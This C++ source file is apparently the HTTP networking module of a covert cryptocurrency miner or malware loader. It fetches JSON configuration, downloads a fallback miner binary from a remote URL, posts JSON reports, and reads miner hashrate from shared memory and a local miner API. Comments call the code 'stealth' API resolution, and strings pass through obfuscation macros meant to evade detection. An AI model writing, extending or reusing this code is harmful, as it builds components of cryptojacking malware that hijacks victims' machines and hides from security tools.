#include "../include/http_client.h"
#include "../include/json.hpp"
#include "../include/encryption.h"
#include "../include/dvm_str.h"
#include <iostream>

// Upper bound on a single HTTP response body (config JSON, miner stats or a
// fallback miner binary). Prevents an unbounded "available data" report from
// spinning the read loop into an endless grow / OOM.
static const size_t kMaxHttpResponseBytes = 32 * 1024 * 1024;

// Stealth function pointer types for WinHttp functions
typedef HINTERNET(WINAPI *pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI *pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET(WINAPI *pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL(WINAPI *pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI *pWinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef BOOL(WINAPI *pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
typedef BOOL(WINAPI *pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI *pWinHttpCrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);
typedef BOOL(WINAPI *pWinHttpCloseHandle)(HINTERNET);
typedef BOOL(WINAPI *pWinHttpAddRequestHeaders)(HINTERNET, LPCWSTR, DWORD, DWORD);

std::string fetchJsonFromUrl(const std::wstring& url, int useSSL) {
    // Use stealth API resolution for WinHttp functions with string literals
    pWinHttpCrackUrl _WinHttpCrackUrl = (pWinHttpCrackUrl)WinHttpCrackUrl;
    pWinHttpOpen _WinHttpOpen = (pWinHttpOpen)WinHttpOpen;
    pWinHttpConnect _WinHttpConnect = (pWinHttpConnect)WinHttpConnect;
    pWinHttpOpenRequest _WinHttpOpenRequest = (pWinHttpOpenRequest)WinHttpOpenRequest;
    pWinHttpSendRequest _WinHttpSendRequest = (pWinHttpSendRequest)WinHttpSendRequest;
    pWinHttpReceiveResponse _WinHttpReceiveResponse = (pWinHttpReceiveResponse)WinHttpReceiveResponse;
    pWinHttpQueryDataAvailable _WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)WinHttpQueryDataAvailable;
    pWinHttpReadData _WinHttpReadData = (pWinHttpReadData)WinHttpReadData;
    pWinHttpCloseHandle _WinHttpCloseHandle = (pWinHttpCloseHandle)WinHttpCloseHandle;

    if (!_WinHttpCrackUrl || !_WinHttpOpen) {
        std::cerr << "Failed to resolve WinHttp functions" << std::endl;
        return "";
    }

    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    if (!_WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp)) {
        std::cerr << "Failed to parse URL." << std::endl;
        return "";
    }

    std::wstring hostname(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

    std::string _uaNarrow = "WinHTTP/1.0";
    std::wstring userAgent(_uaNarrow.begin(), _uaNarrow.end());
    HINTERNET hSession = _WinHttpOpen(
        userAgent.c_str(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );
    if (!hSession) {
        std::cerr << "Failed to initialize WinHTTP." << std::endl;
        return "";
    }

    HINTERNET hConnect = _WinHttpConnect(hSession, hostname.c_str(), urlComp.nPort, 0);
    if (!hConnect) {
        _WinHttpCloseHandle(hSession);
        std::cerr << "Failed to connect to host." << std::endl;
        return "";
    }

    // Determine SSL flag: use useSSL parameter if provided (1), otherwise check URL scheme
    DWORD flags = 0;
    if (useSSL == 1 || urlComp.nScheme == INTERNET_SCHEME_HTTPS) {
        flags = WINHTTP_FLAG_SECURE;
    }

    HINTERNET hRequest = _WinHttpOpenRequest(
        hConnect, 
        L"GET", 
        path.empty() ? L"/" : path.c_str(),
        NULL, 
        WINHTTP_NO_REFERER, 
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags
    );
    if (!hRequest) {
        _WinHttpCloseHandle(hConnect);
        _WinHttpCloseHandle(hSession);
        std::cerr << "Failed to create HTTP request." << std::endl;
        return "";
    }

    if (!_WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
        _WinHttpCloseHandle(hRequest);
        _WinHttpCloseHandle(hConnect);
        _WinHttpCloseHandle(hSession);
        std::cerr << "Failed to send HTTP request." << std::endl;
        return "";
    }

    if (!_WinHttpReceiveResponse(hRequest, NULL)) {
        _WinHttpCloseHandle(hRequest);
        _WinHttpCloseHandle(hConnect);
        _WinHttpCloseHandle(hSession);
        std::cerr << "Failed to receive HTTP response." << std::endl;
        return "";
    }

    std::string response;
    DWORD dwSize = 0;
    for (;;) {
        // Reset the size before each query: WinHttpQueryDataAvailable leaves
        // the value untouched on failure, so a stale >0 would otherwise keep
        // this loop spinning on a dead connection. Bail on error/zero.
        dwSize = 0;
        if (!_WinHttpQueryDataAvailable(hRequest, &dwSize) || dwSize == 0)
            break;
        if (response.size() + static_cast<size_t>(dwSize) > kMaxHttpResponseBytes)
            break;

        char* buffer = new char[dwSize + 1];
        DWORD dwDownloaded = 0;
        if (_WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
            buffer[dwDownloaded] = '\0';
            response += buffer;
        }
        delete[] buffer;
    }

    _WinHttpCloseHandle(hRequest);
    _WinHttpCloseHandle(hConnect);
    _WinHttpCloseHandle(hSession);

    return response;
}

double GetMinerHashrate() {
    const char* kMapName = DVM_STR("Local\\Hashrate");
    HANDLE hMap = OpenFileMappingA(FILE_MAP_READ, FALSE, kMapName);
    DVM_FREE(kMapName);
    if (!hMap) {
        return 0.0;
    }
    const auto *ptr = static_cast<const double *>(MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, sizeof(double)));
    double hashrate = 0.0;
    if (ptr) {
        hashrate = *ptr;
        UnmapViewOfFile(ptr);
    }
    CloseHandle(hMap);
    return hashrate;
}

// Get GPU miner (SRBMiner-MULTI) hashrate and unit from API endpoint
std::pair<double, std::string> GetGPUMinerHashrate() {
    std::string response = fetchJsonFromUrl(L"http://127.0.0.1:21550/stat");

    if (response.empty()) {
        return {0.0, "H/s"};
    }

    try {
        auto jsonObj = nlohmann::json::parse(response);

        // GMiner API (/stat): pool_speed + speed_unit
        const char* kPoolSpeed = DVM_STR("pool_speed");
        const char* kSpeedUnit = DVM_STR("speed_unit");
        if (jsonObj.contains(kPoolSpeed) && jsonObj[kPoolSpeed].is_number()) {
            double hashrate = jsonObj[kPoolSpeed].get<double>();
            const char* kHs = DVM_STR("H/s");
            std::string unit = kHs;
            DVM_FREE(kHs);
            if (jsonObj.contains(kSpeedUnit) && jsonObj[kSpeedUnit].is_string()) {
                unit = jsonObj[kSpeedUnit].get<std::string>();
            }
            DVM_FREE(kPoolSpeed);
            DVM_FREE(kSpeedUnit);
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] GMiner pool_speed: " << hashrate << " " << unit << std::endl;
#endif
            return {hashrate, unit};
        }
        DVM_FREE(kPoolSpeed);
        DVM_FREE(kSpeedUnit);
    } catch (const std::exception& e) {
        const char* kErr = DVM_STR("[-] Error parsing stats: ");
        std::cerr << kErr << e.what() << std::endl;
        DVM_FREE(kErr);
    }

    const char* kHs0 = DVM_STR("H/s");
    std::string rv = kHs0;
    DVM_FREE(kHs0);
    return {0.0, rv};
}

// Download binary data from URL
BYTE* downloadBinaryFromUrl(const std::wstring& url, size_t& outSize, int useSSL) {
    pWinHttpCrackUrl _WinHttpCrackUrl = (pWinHttpCrackUrl)WinHttpCrackUrl;
    pWinHttpOpen _WinHttpOpen = (pWinHttpOpen)WinHttpOpen;
    pWinHttpConnect _WinHttpConnect = (pWinHttpConnect)WinHttpConnect;
    pWinHttpOpenRequest _WinHttpOpenRequest = (pWinHttpOpenRequest)WinHttpOpenRequest;
    pWinHttpSendRequest _WinHttpSendRequest = (pWinHttpSendRequest)WinHttpSendRequest;
    pWinHttpReceiveResponse _WinHttpReceiveResponse = (pWinHttpReceiveResponse)WinHttpReceiveResponse;
    pWinHttpQueryDataAvailable _WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)WinHttpQueryDataAvailable;
    pWinHttpReadData _WinHttpReadData = (pWinHttpReadData)WinHttpReadData;
    pWinHttpCloseHandle _WinHttpCloseHandle = (pWinHttpCloseHandle)WinHttpCloseHandle;
    if (!_WinHttpCrackUrl || !_WinHttpOpen) { outSize = 0; return nullptr; }

    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    if (!_WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp)) {
        outSize = 0; return nullptr;
    }

    std::wstring hostname(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

    std::string _uaNarrow2 = "WinHTTP/1.0";
    std::wstring userAgent(_uaNarrow2.begin(), _uaNarrow2.end());
    HINTERNET hSession = _WinHttpOpen(userAgent.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { outSize = 0; return nullptr; }

    HINTERNET hConnect = _WinHttpConnect(hSession, hostname.c_str(), urlComp.nPort, 0);
    if (!hConnect) { _WinHttpCloseHandle(hSession); outSize = 0; return nullptr; }

    DWORD flags = (useSSL == 1 || urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = _WinHttpOpenRequest(hConnect, L"GET",
        path.empty() ? L"/" : path.c_str(), NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); outSize = 0; return nullptr; }

    if (!_WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0)) {
        _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); outSize = 0; return nullptr;
    }
    if (!_WinHttpReceiveResponse(hRequest, NULL)) {
        _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); outSize = 0; return nullptr;
    }

    std::vector<BYTE> buffer;
    DWORD dwSize = 0;
    for (;;) {
        dwSize = 0;
        if (!_WinHttpQueryDataAvailable(hRequest, &dwSize) || dwSize == 0)
            break;
        if (buffer.size() + static_cast<size_t>(dwSize) > kMaxHttpResponseBytes)
            break;

        BYTE* tempBuffer = new BYTE[dwSize];
        DWORD dwDownloaded = 0;
        if (_WinHttpReadData(hRequest, tempBuffer, dwSize, &dwDownloaded))
            buffer.insert(buffer.end(), tempBuffer, tempBuffer + dwDownloaded);
        delete[] tempBuffer;
    }

    _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession);

    if (buffer.empty()) { outSize = 0; return nullptr; }
    outSize = buffer.size();
    BYTE* result = new BYTE[outSize];
    memcpy(result, buffer.data(), outSize);
    return result;
}

std::string postJsonToUrl(const std::wstring& url, const std::string& jsonData, int useSSL) {
    pWinHttpCrackUrl _WinHttpCrackUrl = (pWinHttpCrackUrl)WinHttpCrackUrl;
    pWinHttpOpen _WinHttpOpen = (pWinHttpOpen)WinHttpOpen;
    pWinHttpConnect _WinHttpConnect = (pWinHttpConnect)WinHttpConnect;
    pWinHttpOpenRequest _WinHttpOpenRequest = (pWinHttpOpenRequest)WinHttpOpenRequest;
    pWinHttpAddRequestHeaders _WinHttpAddRequestHeaders = (pWinHttpAddRequestHeaders)WinHttpAddRequestHeaders;
    pWinHttpSendRequest _WinHttpSendRequest = (pWinHttpSendRequest)WinHttpSendRequest;
    pWinHttpReceiveResponse _WinHttpReceiveResponse = (pWinHttpReceiveResponse)WinHttpReceiveResponse;
    pWinHttpQueryDataAvailable _WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)WinHttpQueryDataAvailable;
    pWinHttpReadData _WinHttpReadData = (pWinHttpReadData)WinHttpReadData;
    pWinHttpCloseHandle _WinHttpCloseHandle = (pWinHttpCloseHandle)WinHttpCloseHandle;
    if (!_WinHttpCrackUrl || !_WinHttpOpen) return "";

    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    if (!_WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp)) return "";

    std::wstring hostname(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

    std::string _uaNarrow3 = "WinHTTP/1.0";
    std::wstring userAgent(_uaNarrow3.begin(), _uaNarrow3.end());
    HINTERNET hSession = _WinHttpOpen(userAgent.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "";

    HINTERNET hConnect = _WinHttpConnect(hSession, hostname.c_str(), urlComp.nPort, 0);
    if (!hConnect) { _WinHttpCloseHandle(hSession); return ""; }

    DWORD flags = (useSSL == 1 || urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = _WinHttpOpenRequest(hConnect, L"POST",
        path.empty() ? L"/" : path.c_str(), NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); return ""; }

    std::string _ctNarrow = "Content-Type: application/json";
    std::wstring contentType(_ctNarrow.begin(), _ctNarrow.end());
    if (_WinHttpAddRequestHeaders && !_WinHttpAddRequestHeaders(hRequest, contentType.c_str(), (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD)) {
        _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); return "";
    }

    if (!_WinHttpSendRequest(hRequest, NULL, 0, (void*)jsonData.c_str(), (DWORD)jsonData.length(), (DWORD)jsonData.length(), 0)) {
        _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); return "";
    }
    if (!_WinHttpReceiveResponse(hRequest, NULL)) {
        _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); return "";
    }

    std::string response;
    DWORD dwSize = 0;
    for (;;) {
        dwSize = 0;
        if (!_WinHttpQueryDataAvailable(hRequest, &dwSize) || dwSize == 0)
            break;
        if (response.size() + static_cast<size_t>(dwSize) > kMaxHttpResponseBytes)
            break;

        char* buffer = new char[dwSize + 1];
        DWORD dwDownloaded = 0;
        if (_WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
            buffer[dwDownloaded] = '\0';
            response += buffer;
        }
        delete[] buffer;
    }

    _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession);
    return response;
}
